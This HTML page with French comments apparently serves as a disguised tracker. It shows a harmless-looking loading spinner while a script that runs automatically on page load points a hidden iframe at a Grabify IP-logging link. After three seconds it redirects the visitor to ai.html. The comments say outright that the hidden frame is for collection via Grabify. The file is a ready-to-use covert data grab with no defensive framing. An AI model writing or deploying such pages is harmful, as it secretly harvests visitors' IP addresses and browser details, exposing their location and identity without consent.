<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chargement...</title>
    <style>
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
        .loader {
            border: 16px solid #f3f3f3;
            border-radius: 50%;
            border-top: 16px solid #3498db;
            width: 120px;
            height: 120px;
            animation: spin 2s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #hiddenFrame {
            display: none;
        }
    </style>

    <script>
        function redirectToGrabify() {
            var iframe = document.getElementById('hiddenFrame');
            iframe.src = "https://grabify.link/4QVE68"; // Ton lien Grabify
            setTimeout(function() {
                document.querySelector('.overlay').style.display = 'none'; // Masquer l'animation
                window.location.href = "ai.html"; // Redirection vers ai.html une fois terminé
            }, 3000); // Attendre 3 secondes avant de rediriger
        }
    </script>
</head>
<body onload="redirectToGrabify()">
    <!-- Animation de chargement -->
    <div class="overlay">
        <div class="loader"></div>
    </div>
    
    <!-- iframe caché pour la collecte avec Grabify -->
    <iframe id="hiddenFrame"></iframe>
</body>
</html>
